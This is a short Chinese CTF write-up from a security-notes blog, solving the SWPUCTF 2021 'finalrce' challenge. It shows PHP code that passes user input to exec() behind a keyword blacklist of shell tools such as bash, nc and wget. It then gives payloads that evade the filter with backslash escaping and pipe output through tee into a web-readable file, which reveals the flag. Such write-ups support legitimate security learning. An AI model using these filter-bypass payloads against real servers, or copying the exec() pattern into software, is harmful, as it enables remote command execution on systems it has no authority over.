---
title: "网安笔记 - 靶场实例 - RCE - CTF - 无回显 - SWPUCTF 2021 新生赛-finalrce"
category: "网安笔记"
date: 2026-04-09
published: 2026-04-09
author: "Rin"
---

```php
<?php  
highlight_file(__FILE__);  
if(isset($_GET['url']))  
{    $url=$_GET['url'];  
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))  
    {  
        echo "Sorry,you can't use this.";  
    }  
    else  
    {  
        echo "Can you see anything?";        exec($url);  
    }
```

 - 输入l\s 发现无回显
 - 那么就直接写入文件 **payload** l\s / | tee 1.txt
 - 然后直接访问1.txt 回显
```txt
a_here_is_a_f1ag
bin
boot
dev
etc
flllllaaaaaaggggggg
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

-  再写入命令 l\s /flllll\aaaaaaggggggg | tee 2.txt
- 访问2.txt
- 回显

```txt
NSSCTF{08e79dcc-292c-48fe-bf93-a3c6ab311a43}
```
`